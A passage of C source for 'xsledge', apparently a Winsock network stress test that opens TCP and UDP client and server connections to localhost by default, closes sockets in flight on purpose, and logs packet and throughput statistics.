    if((select(1, ReadCollection, WriteCollection, ExceptCollection, pTimeOut)) != 1)
        return FALSE;
    else
        return TRUE;
}


//==================================================================================
// RetrieveTestSettings
//----------------------------------------------------------------------------------
//
// Description: Reads profile variables for the given app into globals for this test
//
// Arguments:
//  none
//
// Returns:
//  none
//==================================================================================
void RetrieveTestSettings(void)
{
    INT     nTemp = 0;
    CHAR    szTemp[MAX_STRING_SIZE];
    DWORD   dwIPAddr = 0;

    // Are we verbose?
    nTemp = GetProfileIntA("xsledge", "Verbose", 0);
    g_fVerbose = (nTemp ? TRUE : FALSE);

    // Use non-blocking socket calls?
    nTemp = GetProfileIntA("xsledge", "NonBlockingSockets", 0);
    g_fNonBlocking = (nTemp ? TRUE : FALSE);

    // What class of data to put in the packets?
    memset(szTemp, 0, sizeof(szTemp));
    GetProfileStringA("xsledge", "DataType", "Constant", szTemp, MAX_STRING_SIZE * sizeof(CHAR));
    if(!strcmp(szTemp, "Constant"))
        g_ptTxDataType = CONSTANT;
    else if(!strcmp(szTemp, "Increment"))
        g_ptTxDataType = INCREMENT;
    else
        g_ptTxDataType = RANDOM;

    // Allow in-flight closes?
    nTemp = GetProfileIntA("xsledge", "InFlightCloses", IN_FLIGHT_CLOSES);
    g_SledgeParms.InFlightCloses = (nTemp ? TRUE : FALSE);

    // Use UDP?
    nTemp = GetProfileIntA("xsledge", "UDPServer", 0);
    g_SledgeParms.ServUDP = (nTemp ? TRUE : FALSE);
    g_fIsServer = (g_SledgeParms.ServUDP ? TRUE : g_fIsServer);

    // Use TCP?
    nTemp = GetProfileIntA("xsledge", "TCPServer", 0);
    g_SledgeParms.ServTCP = (nTemp ? TRUE : FALSE);
    g_fIsServer = (g_SledgeParms.ServTCP ? TRUE : g_fIsServer);

    if(g_fIsServer)
    {
        // What receive length?
        nTemp = GetProfileIntA("xsledge", "ReceiveLength", SERV_RECV_LEN);
        g_SledgeParms.ServRecvLen = nTemp;

        // What percent sleepy receives?
        nTemp = GetProfileIntA("xsledge", "SleepyReceives", SERV_PERCENT_SLEEPY_RECVS);
        g_SledgeParms.ServSleepyRecvs = nTemp;
    }
    else
    {
        // How many packets per connection?
        nTemp = GetProfileIntA("xsledge", "PacketsPerConn", PACKETS_PER_CONN);
        g_SledgeParms.PacketsPerConn = nTemp;

        // How many simultaneous TCP connections?
        nTemp = GetProfileIntA("xsledge", "TCPConnections", CLIENT_TCP_CONNS);
        g_SledgeParms.ClientTCPConns = nTemp;

        // How many simultaneous TCP connections?
        nTemp = GetProfileIntA("xsledge", "TCPCycles", CLIENT_TCP_CYCLES);
        g_SledgeParms.ClientTCPCycles = nTemp;

        // Max size for packets on TCP connections?
        nTemp = GetProfileIntA("xsledge", "TCPMaxSize", MAX_PACKET_LEN);
        g_SledgeParms.TCPMaxPacketLen = nTemp;

        // Min size for packets on TCP connections?
        nTemp = GetProfileIntA("xsledge", "TCPMinSize", MIN_PACKET_LEN);
        g_SledgeParms.TCPMinPacketLen = nTemp;

        // What address for the TCP connections?
        memset(szTemp, 0, sizeof(szTemp));
        GetProfileStringA("xsledge", "TCPAddress", "127.0.0.1", szTemp, MAX_STRING_SIZE * sizeof(CHAR));
        if((dwIPAddr = inet_addr(szTemp)) == -1L)
        {
            // If we were given a bad address, then just go with the address we know works
            dwIPAddr = inet_addr("127.0.0.1");
        }
        g_SledgeParms.ServTCPAddr = htonl(dwIPAddr);

        // How many simultaneous UDP connections?
        nTemp = GetProfileIntA("xsledge", "UDPConnections", CLIENT_UDP_CONNS);
        g_SledgeParms.ClientUDPConns = nTemp;

        // How many simultaneous UDP connections?
        nTemp = GetProfileIntA("xsledge", "UDPCycles", CLIENT_UDP_CYCLES);
        g_SledgeParms.ClientUDPCycles = nTemp;

        // Max size for packets on UDP connections?
        nTemp = GetProfileIntA("xsledge", "UDPMaxSize", MAX_PACKET_LEN);
        g_SledgeParms.UDPMaxPacketLen = nTemp;

        // Min size for packets on UDP connections?
        nTemp = GetProfileIntA("xsledge", "UDPMinSize", MIN_PACKET_LEN);
        g_SledgeParms.UDPMinPacketLen = nTemp;

        // Sleep between UDP sends?
        nTemp = GetProfileIntA("xsledge", "UDPSleep", UDP_SLEEP_BEFORE_NEXT);
        g_SledgeParms.UDPSleepBeforeNext = nTemp;

        // What address for the UDP connections?
        memset(szTemp, 0, sizeof(szTemp));
        GetProfileStringA("xsledge", "UDPAddress", "127.0.0.1", szTemp, MAX_STRING_SIZE * sizeof(CHAR));
        if((dwIPAddr = inet_addr(szTemp)) == -1L)
        {
            // If we were given a bad address, then just go with the address we know works
            dwIPAddr = inet_addr("127.0.0.1");
        }
        g_SledgeParms.ServUDPAddr = htonl(dwIPAddr);

        // What percent sleepy receives?
        nTemp = GetProfileIntA("xsledge", "SleepyReceives", CLIENT_PERCENT_SLEEPY_RECVS);
        g_SledgeParms.ClientSleepyRecvs = nTemp;
    }

    if(g_fIsServer)
    {
        g_SledgeParms.ClientTCPConns    = 0;
        g_SledgeParms.ClientUDPConns    = 0;
    }
    else
    {
        g_SledgeParms.ServTCP           = FALSE;
        g_SledgeParms.ServUDP           = FALSE;
    }

    g_iClientConns = g_SledgeParms.ClientTCPConns + g_SledgeParms.ClientUDPConns;

    return;
}

//==================================================================================
// VerifyValidParams
//----------------------------------------------------------------------------------
//
// Description: Verifies that we are running with valid test parameters
//
// Arguments:
//  none
//
// Returns:
//  TRUE if the parameters are OK, FALSE otherwise
//==================================================================================
BOOL VerifyValidParams()
{
    if(g_iClientConns > MAX_CLIENT_CONNS)
    {
        SledgeLog(g_hLog, XLL_WARN, "Max connections (%d) exceeded", MAX_CLIENT_CONNS);
        return FALSE;
    }

    if (g_SledgeParms.TCPMaxPacketLen > PACKET_MAX_LEN)
    {
        SledgeLog(g_hLog, XLL_WARN, "TCPMaxPacketLen (%u) > PACKET_MAX_LEN (%u)", g_SledgeParms.TCPMaxPacketLen, PACKET_MAX_LEN);
        return FALSE;
    }

    if  (g_SledgeParms.ServRecvLen > PACKET_MAX_LEN)
    {
        SledgeLog(g_hLog, XLL_WARN, "ServRecvLen (%u) > PACKET_MAX_LEN (%u)", g_SledgeParms.ServRecvLen, PACKET_MAX_LEN);
        return FALSE;
    }

    return TRUE;
}

//==================================================================================
// StartNonClientThreads
//----------------------------------------------------------------------------------
//
// Description: Starts all non-client threads (hatchet, display and server threads)
//
// Arguments:
//  none
//
// Returns:
//  TRUE if successful, FALSE otherwise
//==================================================================================
BOOL StartNonClientThreads()
{
    HANDLE  hThread;
    DWORD   dwThreadId;

    //Start the DisplayThread
    if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DisplayThread, NULL, 0, &dwThreadId)) == NULL)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge: CreateThread(DisplayThread) failed %d", GetLastError());
        return FALSE;
    }

    //If necessary, start the HatchetThread
    if (g_SledgeParms.InFlightCloses)
    {
        if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) HatchetThread, NULL, 0, &dwThreadId)) == NULL)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge: CreateThread(Hatchet) failed %d", GetLastError());
            return FALSE;
        }

        CloseHandle(hThread);
    }

    //If necessary, start the TCPServThread
    if (g_SledgeParms.ServTCP)
    {
        if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) TCPServThread, NULL, 0, &dwThreadId)) == NULL)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: CreateThread(TCPServThread) failed %d", CONN_TYPES_Str[CONN_TCP], GetLastError());
            return FALSE;
        }

        CloseHandle(hThread);
    }

    //If necessary, start the UDPServThread
    if (g_SledgeParms.ServUDP)
    {
        if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) UDPServThread, NULL, 0, &dwThreadId)) == NULL)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%s]: CreateThread(UDPServThread) failed %d", CONN_TYPES_Str[CONN_UDP], GetLastError());
            return FALSE;
        }

        CloseHandle(hThread);
    }

    return TRUE;
}

//==================================================================================
// IsSledgeComplete
//----------------------------------------------------------------------------------
//
// Description: Determines if the current test is complete
//
// Arguments:
//  none
//
// Returns:
//  TRUE if successful, FALSE otherwise
//==================================================================================
BOOL IsSledgeComplete()
{
    INT iConn;

    EnterCriticalSection(&g_csSledgeCritSection);

    // If any sockets haven't reached their total cycles or any are still connected, the test isn' over
    for (iConn = 0; iConn < g_iClientConns; iConn++)
    {
        if (g_ccClientConns[iConn].Cycle != g_ccClientConns[iConn].Cycles || g_ccClientConns[iConn].Connected)
        {
            LeaveCriticalSection(&g_csSledgeCritSection);
            return FALSE;
        }
    }

    // If this is a server test, then the test isn't over
    if (g_SledgeParms.ServTCP || g_SledgeParms.ServUDP)
    {
        LeaveCriticalSection(&g_csSledgeCritSection);
        return FALSE;
    }

    LeaveCriticalSection(&g_csSledgeCritSection);
    return TRUE;
}

//==================================================================================
// StartTest
//----------------------------------------------------------------------------------
//
// Description: Test entry point
//
// Arguments:
//  HANDLE      hLog            Handle to logging subsystem
// Returns:
//  none
//==================================================================================
VOID WINAPI StartTest(IN HANDLE  hLog)
{
    INT     iConn;
    HANDLE  hThread;
    DWORD   dwThreadId;
    WSADATA WSAData;
    INT     nRet = 0;


    // Since we have to be thread safe, serialize entry for now
    EnterCriticalSection(&g_csSerializeAccess);

    g_hLog = hLog;

    // Set the component and subcomponent
    xSetComponent(g_hLog, "Network(S)", "Winsock");

    // Init winsock
    if(nRet = WSAStartup(MAKEWORD(2, 2), &WSAData))
    {
        SledgeLog(g_hLog, XLL_FAIL, "Couldn't init winsock: %d", nRet);
        goto ExitMain;
    }

    SledgeLog(g_hLog, XLL_INFO, "Winsock layer initialized");

    // Get the test settings from the INI file
//  RetrieveTestSettings();
    HardcodeTestSettings();

    // Output the parameters for this test
    SledgeLog(g_hLog, XLL_INFO, "********************************************************");
    SledgeLog(g_hLog, XLL_INFO, "<< Sledge Parameters >>");
    SledgeLog(g_hLog, XLL_INFO, "********************************************************");
    if (g_fIsServer)
    {
        CHAR  szProtocols[15] = "";

        SledgeLog(g_hLog, XLL_INFO, "Running as server...");
        if (g_SledgeParms.ServTCP)
            strcat(szProtocols, "TCP ");
        if (g_SledgeParms.ServUDP)
            strcat(szProtocols, "UDP ");
        SledgeLog(g_hLog, XLL_INFO, "Protocols:            %s", szProtocols);
        SledgeLog(g_hLog, XLL_INFO, "ReceiveSize:          %d", g_SledgeParms.ServRecvLen);
        SledgeLog(g_hLog, XLL_INFO, "Hatchet Status:       %s", g_SledgeParms.InFlightCloses ? "ENABLED" : "DISABLED");
    }
    else
    {
        SledgeLog(g_hLog, XLL_INFO, "Running as client...");
        SledgeLog(g_hLog, XLL_INFO, "Packets per cycle:    %d", g_SledgeParms.PacketsPerConn);
        SledgeLog(g_hLog, XLL_INFO, "Hatchet Status:       %s", g_SledgeParms.InFlightCloses ? "ENABLED" : "DISABLED");
        if(g_SledgeParms.ClientTCPConns)
        {
            SledgeLog(g_hLog, XLL_INFO, "TCP connections:      %d",
                g_SledgeParms.ClientTCPConns);
            SledgeLog(g_hLog, XLL_INFO, "Cycles to run:        %d",
                g_SledgeParms.ClientTCPCycles);
            SledgeLog(g_hLog, XLL_INFO, "Packet Size:          Min = %d  Max = %d",
                g_SledgeParms.TCPMinPacketLen,
                g_SledgeParms.TCPMaxPacketLen);
            SledgeLog(g_hLog, XLL_INFO, "Server Address:       0x%8x",
                g_SledgeParms.ServTCPAddr);
        }
        if(g_SledgeParms.ClientUDPConns)
        {
            SledgeLog(g_hLog, XLL_INFO, "UDP connections:      %d",
                g_SledgeParms.ClientUDPConns);
            SledgeLog(g_hLog, XLL_INFO, "Cycles to run:        %d",
                g_SledgeParms.ClientUDPCycles);
            SledgeLog(g_hLog, XLL_INFO, "Packet Size:          Min = %d  Max = %d",
                g_SledgeParms.UDPMinPacketLen,
                g_SledgeParms.UDPMaxPacketLen);
            SledgeLog(g_hLog, XLL_INFO, "Server Address:       0x%8x",
                g_SledgeParms.ServUDPAddr);
        }
    }
    SledgeLog(g_hLog, XLL_INFO, "********************************************************");

    // Verify that the test parameters are valid
    if(!VerifyValidParams())
    {
        SledgeLog(g_hLog, XLL_FAIL, "Test parameters aren't valid");
        goto ExitMain;
    }

    if ((g_hCreateThreadsEvent = CreateEvent(NULL, FALSE, TRUE, NULL)) == NULL)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge: CreateEvent(g_hCreateThreadsEvent) failed %d", GetLastError());
        goto ExitMain;
    }

    // Initialize server connection structures
    for (iConn = 0; iConn < MAX_SERV_CONNS; iConn++)
    {
        memset(&g_scServConns[iConn], 0, sizeof(SERV_CONNS));
        g_scServConns[iConn].ConnType         = CONN_IDLE;
        g_scServConns[iConn].Index            = iConn;
        g_scServConns[iConn].PacketLenMin     = 9999;
        g_scServConns[iConn].SendInProgress   = 0;
        g_scServConns[iConn].RecvInProgress   = 0;
    }

    if(g_iClientConns)
        SledgeLog(g_hLog, XLL_INFO, "%d connection(s) to initialize", g_iClientConns);

    // Initialize client connection structures
    for (iConn = 0; iConn < g_iClientConns; iConn++)
    {
        memset(&g_ccClientConns[iConn], 0, sizeof(CLIENT_CONNS));
        g_ccClientConns[iConn].Index          = iConn;
        g_ccClientConns[iConn].Connected      = FALSE;
        g_ccClientConns[iConn].SendThreadDown = FALSE;
        g_ccClientConns[iConn].RecvThreadDown = FALSE;
        g_ccClientConns[iConn].PacketLenMin   = 9999;
        g_ccClientConns[iConn].NextChar       = 'a';
        g_ccClientConns[iConn].TotalLatePackets = 0;
        g_ccClientConns[iConn].TotalLostPackets = 0;
        g_ccClientConns[iConn].TotalBadPackets = 0;
        g_ccClientConns[iConn].fCSInitialized = TRUE;
        InitializeCriticalSection(&(g_ccClientConns[iConn].csSendRecv));

        if (iConn < g_SledgeParms.ClientUDPConns)
        {
            g_ccClientConns[iConn].ConnType = CONN_UDP;
            g_ccClientConns[iConn].Cycles   = g_SledgeParms.ClientUDPCycles;
        }
        else
        {
            g_ccClientConns[iConn].ConnType = CONN_TCP;
            g_ccClientConns[iConn].Cycles   = g_SledgeParms.ClientTCPCycles;
        }


        if ((g_ccClientConns[iConn].hPacketsOutEvent = CreateEvent(NULL, FALSE, FALSE, NULL)) == NULL)
        {
            SledgeLog(g_hLog, XLL_WARN, "Sledge[%d]: CreateEvent(hPacketsOutEvent) failed %d", iConn, GetLastError());
            goto ExitMain;
        }
    }

    // Start all non-client threads
    if(!StartNonClientThreads())
    {
        goto ExitMain;
    }

    while (1)
    {
        // Wait for a signal that we need to restart a thread
        WaitForSingleObject(g_hCreateThreadsEvent, INFINITE);

        // See if the global test exit condition has been triggered
        if (g_fExit)
        {
            SledgeLog(g_hLog, XLL_FAIL, "Global exit triggered.");
            g_bFinished = TRUE;
            goto ExitMain;
        }

        // If the test is complete, then exit
        if(IsSledgeComplete())
        {
            SledgeLog(g_hLog, XLL_INFO, "Sledge: exiting normally");
            g_bFinished = TRUE;
            goto ExitMain;
        }

        EnterCriticalSection(&g_csSledgeCritSection);

//      SledgeLog(g_hLog, XLL_INFO, "Spawning client threads.");

        // Scan for sockets that need to be restarted
        for (iConn = 0; iConn < g_iClientConns; iConn++)
        {
            if ((g_ccClientConns[iConn].Cycle < g_ccClientConns[iConn].Cycles) &&
                ! g_ccClientConns[iConn].Connected)
            {
                // Reset the connection parameters for each socket that needs to be restarted
                g_ccClientConns[iConn].Cycle = (g_ccClientConns[iConn].Cycle + 1) % INFINITE_CYCLES;
                g_ccClientConns[iConn].PacketLenMin    = 9999;
                g_ccClientConns[iConn].PacketLenMax    = 0;
                g_ccClientConns[iConn].TotalPacketsOut = 0;
                g_ccClientConns[iConn].TotalBytesOut   = 0;
                g_ccClientConns[iConn].DeltaBytesOut   = 0;
                g_ccClientConns[iConn].TotalPacketsIn  = 0;
                g_ccClientConns[iConn].TotalBytesIn    = 0;
                g_ccClientConns[iConn].DeltaBytesIn    = 0;
                g_ccClientConns[iConn].PacketsOutHead  = 0;
                g_ccClientConns[iConn].PacketsOutTail  = 0;
                g_ccClientConns[iConn].PacketsOutCount = 0;
                g_ccClientConns[iConn].SendThreadDown  = FALSE;
                g_ccClientConns[iConn].RecvThreadDown  = FALSE;
                g_ccClientConns[iConn].SleepyRecv      = FALSE;
                g_ccClientConns[iConn].InSend          = FALSE;
                g_ccClientConns[iConn].InRecv          = FALSE;
                g_ccClientConns[iConn].InClose         = FALSE;
                g_ccClientConns[iConn].NextChar        = 'a';
                g_ccClientConns[iConn].SendInProgress = 0;
                g_ccClientConns[iConn].RecvInProgress = 0;

                // Connect the socket
                OpenConn(&g_ccClientConns[iConn]);

                // Spawn the receive thread for the socket
                if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ClientRecvThread, &g_ccClientConns[iConn], 0, &dwThreadId)) == NULL)
                {
                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: CreateThread(ClientRecvThread) failed %d",
                        iConn,
                        CONN_TYPES_Str[g_ccClientConns[iConn].ConnType],
                        GetLastError());

                    LeaveCriticalSection(&g_csSledgeCritSection);
                    goto ExitMain;
                }

                CloseHandle(hThread);

                // Spawn the send thread for the socket
                if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ClientSendThread, &g_ccClientConns[iConn], 0, &dwThreadId)) == NULL)
                {
                    SledgeLog(g_hLog, XLL_WARN, "Sledge[%d,%s]: CreateThread(ClientSendThread) failed %d",
                        iConn,
                        CONN_TYPES_Str[g_ccClientConns[iConn].ConnType],
                        GetLastError());

                    LeaveCriticalSection(&g_csSledgeCritSection);
                    goto ExitMain;
                }

                CloseHandle(hThread);
            }
        }

        LeaveCriticalSection(&g_csSledgeCritSection);
    }

ExitMain:

    // Need to clean up the TCP server socket if it exists
    if(g_sTCPServer != INVALID_SOCKET)
    {
        SledgeLog(g_hLog, XLL_INFO, "Closing TCP server socket.");
        if(closesocket(g_sTCPServer) == SOCKET_ERROR)
        {
            SledgeLog(g_hLog, XLL_INFO, "Error closing TCP server socket");
        }

    }

    // Need to clean up the UDP server socket if it exists
    if(g_sUDPServer != INVALID_SOCKET)
    {
        SledgeLog(g_hLog, XLL_INFO, "Closing UDP server socket.");
        if(closesocket(g_sUDPServer) == SOCKET_ERROR)
        {
            SledgeLog(g_hLog, XLL_INFO, "Error closing UDP server socket");
        }

    }

    // Make sure we've cleaned up all of our sockets and critical sections
    for (iConn = 0; iConn < g_iClientConns; iConn++)
    {
        if(g_ccClientConns[iConn].Sock != INVALID_SOCKET)
        {
            SledgeLog(g_hLog, XLL_INFO, "Closing client socket 0x%8x", g_ccClientConns[iConn].Sock);
            closesocket(g_ccClientConns[iConn].Sock);
            g_ccClientConns[iConn].Sock = INVALID_SOCKET;
        }

        if(g_ccClientConns[iConn].fCSInitialized)
            DeleteCriticalSection(&(g_ccClientConns[iConn].csSendRecv));
    }

    // Clean up winsock
    SledgeLog(g_hLog, XLL_INFO, "Cleaning up Winsock layer", g_ccClientConns[iConn].Sock);
    WSACleanup();

    g_hLog = INVALID_HANDLE_VALUE;

    // Allow other threads to enter now
    LeaveCriticalSection(&g_csSerializeAccess);

}

//==================================================================================
// EndTest
//----------------------------------------------------------------------------------
//
// Description: Test exit point
//
// Arguments:
//  none
// Returns:
//  none
//==================================================================================
VOID WINAPI EndTest()
{
    // We already cleaned up everything at the end of StartTest
}

//==================================================================================
// IsValidForHatchet
//----------------------------------------------------------------------------------
//
// Description: Helper function that determines if connection can be killed
//
// Arguments:
//  CLIENT_CONNS    *pClient
// Returns:
//  TRUE if the client can be killed, FALSE otherwise
//==================================================================================
BOOL IsValidForHatchet(CLIENT_CONNS *pClient)
{
    //If less than half the packets have been sent, then we can't kill
    if(pClient->TotalPacketsOut <= (unsigned) g_SledgeParms.PacketsPerConn / 2)
        return FALSE;

    //If the connection is already broken, then we can't kill
    if(pClient->Connected)
        return FALSE;

    //If either thread is down, then we can't kill
    if(pClient->SendThreadDown || pClient->RecvThreadDown)
        return FALSE;

    return TRUE;
}

//==================================================================================
// HatchetThread
//----------------------------------------------------------------------------------
//
// Description: Thread that kills connections if InFlightCloses is turned on
//
// Arguments:
//  LPVOID      *pParm          Just needed because this is a thread proc
// Returns:
//  always 0
//==================================================================================
DWORD WINAPI HatchetThread(LPVOID *pParm)
{
    int iConn;

    SledgeLog(g_hLog, XLL_INFO, "Hatchet thread started");

    while(1)
    {
        Sleep(1000);

        EnterCriticalSection(&g_csSledgeCritSection);

        //Look for hatchet victims
        for (iConn = 0; iConn < g_iClientConns; iConn++)
        {
            switch(g_ccClientConns[iConn].ConnType)
            {
            case CONN_TCP:
            case CONN_UDP:
                //If we find a valid victim, kill it
                if(IsValidForHatchet(&(g_ccClientConns[iConn])))
                {
                    SledgeLog(g_hLog, XLL_INFO, "Sledge[%d,%s]: in-flight closesocket()",
                        g_ccClientConns[iConn].Index,
                        CONN_TYPES_Str[g_ccClientConns[iConn].ConnType]);

                    g_ccClientConns[iConn].InClose = TRUE;

                    if (closesocket(g_ccClientConns[iConn].Sock) == SOCKET_ERROR)
                        g_ccClientConns[iConn].InClose = FALSE;

                    g_ccClientConns[iConn].InClose = FALSE;
                }
                break;
            }
        }
        LeaveCriticalSection(&g_csSledgeCritSection);
    }
    return(0);
}

//==================================================================================
// DisplayThread
//----------------------------------------------------------------------------------
//
// Description: Thread that displays status information about test programs
//
// Arguments:
//  LPVOID      *pParm          Just needed because this is a thread proc
// Returns:
//  always 0
//==================================================================================
DWORD WINAPI DisplayThread(LPVOID *pParm)
{
    int   iConn;

    ULONG DeltaTime;
    ULONG TotalPackets;
    ULONG TotalBytes;
    ULONG TotalBytesPerSec;

    CHAR  *pStr;

    DWORD ElapsedTime, ElapsedSeconds, ElapsedMinutes, ElapsedHours;
    DWORD StartTime = g_dwLastTime = GetTickCount();

    SledgeLog(g_hLog, XLL_INFO, "Display thread started");

    while(1)
    {

        if(g_fVerbose)
        {
            Sleep(10000);

            DeltaTime = GetTickCount() - g_dwLastTime;
            g_dwLastTime += DeltaTime;
            DeltaTime = DeltaTime / 1000;

            if (g_bFinished == TRUE)
            {
                return (0);
            }

            ElapsedTime = g_dwLastTime - StartTime;
            ElapsedSeconds = (ElapsedTime / 1000) % 60;
            ElapsedMinutes = (ElapsedTime / 60000) % 60;
            ElapsedHours = ElapsedTime / 3600000;
            SledgeLog(g_hLog, XLL_INFO, "Running for %dh:%02dm:%02ds", ElapsedHours, ElapsedMinutes, ElapsedSeconds);

            if (g_iServConns > 0)
            {
                TotalPackets = TotalBytes = TotalBytesPerSec = 0;

                SledgeLog(g_hLog, XLL_INFO, " Server            Packet Size");
                SledgeLog(g_hLog, XLL_INFO, "Connection        Min  Max  Avg   Packets      Bytes    Bytes/s");
                SledgeLog(g_hLog, XLL_INFO, "----------       ---- ---- ---- ----------- ----------- -------");

                for (iConn = 0; iConn < MAX_SERV_CONNS; iConn++)
                {
                    if (g_scServConns[iConn].ConnType != CONN_IDLE)
                    {
                        if (g_scServConns[iConn].SleepyRecv)
                            pStr = "zzzz";
                        else
                            pStr = "loop";

                        g_scServConns[iConn].SleepyRecv = FALSE;

                        SledgeLog(g_hLog, XLL_INFO, "%3d %6s       %4d %4d %4d %11d %11d %7d (%s) %c%c%c",
                            g_scServConns[iConn].Index,
                            CONN_TYPES_Str[g_scServConns[iConn].ConnType],
                            g_scServConns[iConn].PacketLenMin,
                            g_scServConns[iConn].PacketLenMax,
                            (g_scServConns[iConn].TotalPacketsLoop > 0) ?
                            g_scServConns[iConn].TotalBytesLoop /
                            g_scServConns[iConn].TotalPacketsLoop :
                        0,
                            g_scServConns[iConn].TotalPacketsLoop,
                            g_scServConns[iConn].TotalBytesLoop,
                            (g_scServConns[iConn].DeltaBytesLoop + DeltaTime -1)
                            / DeltaTime,
                            pStr,
                            (g_scServConns[iConn].InSend)  ? 'S' : ' ',
                            (g_scServConns[iConn].InRecv)  ? 'R' : ' ',
                            (g_scServConns[iConn].InClose) ? 'C' : ' ');

                        TotalPackets += g_scServConns[iConn].TotalPacketsLoop;
                        TotalBytes += g_scServConns[iConn].TotalBytesLoop;
                        TotalBytesPerSec += (g_scServConns[iConn].DeltaBytesLoop +
                            DeltaTime -1)
                            / DeltaTime;
                        g_scServConns[iConn].DeltaBytesLoop = 0;
                    }
                }

                SledgeLog(g_hLog, XLL_INFO, "Totals                          %11d %11d %7d (loop)",
                    TotalPackets, TotalBytes, TotalBytesPerSec);
                SledgeLog(g_hLog, XLL_INFO, "          %12d     %12d",
                    g_scServConns[iConn].RecvInProgress,
                    g_scServConns[iConn].SendInProgress);
            }

            if (g_iClientConns > 0)
            {
                TotalPackets = TotalBytes = TotalBytesPerSec = 0;
                SledgeLog(g_hLog, XLL_INFO, " Client            Packet Size");
                SledgeLog(g_hLog, XLL_INFO, "Connection Cycle  Min  Max  Avg   Packets      Bytes    Bytes/s");
                SledgeLog(g_hLog, XLL_INFO, "---------- ----- ---- ---- ---- ----------- ----------- -------");

                for (iConn = 0; iConn < g_iClientConns; iConn++)
                {
                    if (g_ccClientConns[iConn].ConnType != CONN_IDLE)
                    {
                        if (g_ccClientConns[iConn].SleepyRecv)
                            pStr = "zzzz";
                        else
                            pStr = "recv";

                        g_ccClientConns[iConn].SleepyRecv = FALSE;

                        SledgeLog(g_hLog, XLL_INFO, "%3d %6s %5d %4d %4d %4d %11d %11d %7d (send) %c%c%c",
                            g_ccClientConns[iConn].Index,
                            CONN_TYPES_Str[g_ccClientConns[iConn].ConnType],
                            g_ccClientConns[iConn].Cycle,
                            g_ccClientConns[iConn].PacketLenMin,
                            g_ccClientConns[iConn].PacketLenMax,
                            (g_ccClientConns[iConn].TotalPacketsOut > 0) ?
                            g_ccClientConns[iConn].TotalBytesOut /
                            g_ccClientConns[iConn].TotalPacketsOut : 0,
                            g_ccClientConns[iConn].TotalPacketsOut,
                            g_ccClientConns[iConn].TotalBytesOut,
                            (g_ccClientConns[iConn].DeltaBytesOut+DeltaTime-1) / DeltaTime,
                            (g_ccClientConns[iConn].InSend)  ? 'S' : ' ',
                            (g_ccClientConns[iConn].InRecv)  ? 'R' : ' ',
                            (g_ccClientConns[iConn].InClose) ? 'C' : ' ');

                        SledgeLog(g_hLog, XLL_INFO, "                                %11d %11d %7d (%s)",
                            g_ccClientConns[iConn].TotalPacketsIn,
                            g_ccClientConns[iConn].TotalBytesIn,
                            (g_ccClientConns[iConn].DeltaBytesIn+DeltaTime-1) / DeltaTime,
                            pStr);

                SledgeLog(g_hLog, XLL_INFO, "In Progress Errors");
                SledgeLog(g_hLog, XLL_INFO, "          Recv             Send");
                SledgeLog(g_hLog, XLL_INFO, "          ------------     ------------");
                SledgeLog(g_hLog, XLL_INFO, "          %12d     %12d",
                    g_ccClientConns[iConn].RecvInProgress,
                    g_ccClientConns[iConn].SendInProgress);
                SledgeLog(g_hLog, XLL_INFO, "CurrentSend");
                SledgeLog(g_hLog, XLL_INFO, "          Recv             Send");
                SledgeLog(g_hLog, XLL_INFO, "          ------------     ------------");
                SledgeLog(g_hLog, XLL_INFO, "          %12d     %12d",
                    g_ccClientConns[iConn].RecvInProgress,
                    g_ccClientConns[iConn].SendInProgress);

                        TotalPackets += g_ccClientConns[iConn].TotalPacketsOut;
                        TotalPackets += g_ccClientConns[iConn].TotalPacketsIn;
                        TotalBytes += g_ccClientConns[iConn].TotalBytesOut;
                        TotalBytes += g_ccClientConns[iConn].TotalBytesIn;
                        TotalBytesPerSec += (g_ccClientConns[iConn].DeltaBytesOut +
                            DeltaTime -1) / DeltaTime;
                        TotalBytesPerSec += (g_ccClientConns[iConn].DeltaBytesIn +
                            DeltaTime -1) / DeltaTime;

                        g_ccClientConns[iConn].DeltaBytesOut = 0;

                        g_ccClientConns[iConn].DeltaBytesIn = 0;
                    }
                }

                SledgeLog(g_hLog, XLL_INFO, "Totals                          %11d %11d %7d (client)",
                    TotalPackets, TotalBytes, TotalBytesPerSec);
                SledgeLog(g_hLog, XLL_INFO, "          Lost Packets     Late Packets     Bad Packets ");
                SledgeLog(g_hLog, XLL_INFO, "          ------------     ------------     ------------");
                SledgeLog(g_hLog, XLL_INFO, "          %12d     %12d     %12d\r\n",
                    g_ccClientConns[iConn].TotalLostPackets,
                    g_ccClientConns[iConn].TotalLatePackets,
                    g_ccClientConns[iConn].TotalBadPackets);
            }

        }
        else //if(!g_fVerbose)
        {
            Sleep(30000);

            SledgeLog(g_hLog, XLL_INFO, "Received %d packets, containing %d bytes total",
                g_dwTotalPacketsIn, g_dwTotalBytesIn);
        }


    }

    return(0);
}

//==================================================================================
// WaitForWriteableSocket
//----------------------------------------------------------------------------------
//
// Description: Used to determine when a non-blocking socket is writeable
//
// Arguments:
//  SOCKET      sockServ        Socket to examine for writeability
// Returns:
//  TRUE if the socket is writeable, otherwise FALSE
//==================================================================================
BOOL WaitForWriteableSocket(SOCKET sockServ)
{
    FD_SET  writefds;
    INT     iRet;

    if(sockServ == INVALID_SOCKET)
        return FALSE;

    // Clear all the FD_SET structures
    FD_ZERO(&writefds);
    FD_SET(sockServ, &writefds);

    // Do a blocking select
    if((iRet = select( 0, NULL, &writefds, NULL, NULL)) == SOCKET_ERROR)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[]: select() error %s", GetLastErrorText());
        return FALSE;
    }

    // If select returned but didn't fill any of the FD_SET structures, something is wrong
    if(!iRet)
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[]: select() didn't return any sockets");
        return FALSE;
    }

    // If the socket isn't ready for writing, then something else must have happened... This is a failure.
    if(!FD_ISSET(sockServ, &writefds))
    {
        SledgeLog(g_hLog, XLL_WARN, "Sledge[]: writing socket failed\r\n");
